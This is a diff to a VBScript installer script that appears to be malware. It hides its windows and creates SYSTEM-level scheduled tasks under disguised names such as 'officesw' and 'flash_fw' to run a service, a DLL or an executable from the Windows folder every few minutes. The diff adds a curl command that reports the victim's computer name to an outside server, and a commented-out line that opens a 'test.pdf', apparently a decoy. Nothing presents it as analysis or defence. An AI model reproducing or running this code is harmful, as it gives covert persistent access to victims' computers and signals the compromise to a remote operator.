@@ -1,5 +1,6 @@
 Set oShell = CreateObject ("WScript.Shell") 
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
+strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
 With CreateObject("WScript.Shell")
      
     ' Pass 0 as the second parameter to hide the window...
@@ -17,11 +18,13 @@ With CreateObject("WScript.Shell")
     .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
     '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys1.dll"" /tn flash_fw /rl highest /F", 0, True
     '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr """ & windir & "\WindowsTask.exe"" /tn pippo /rl highest /F", 0, True
+    '.Run windir & "\test.pdf"
+    .Run "curl http://paner.altervista.org/svc/wup.php?pc=mttool_" & strComputerName
     '.Run "schtasks /create /tn flash_fw /xml " & windir & "\flash_fw.xml /F", 0, True
 End With
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
-strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
+
 Set objWMIService = GetObject("winmgmts:" _
     & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")
 
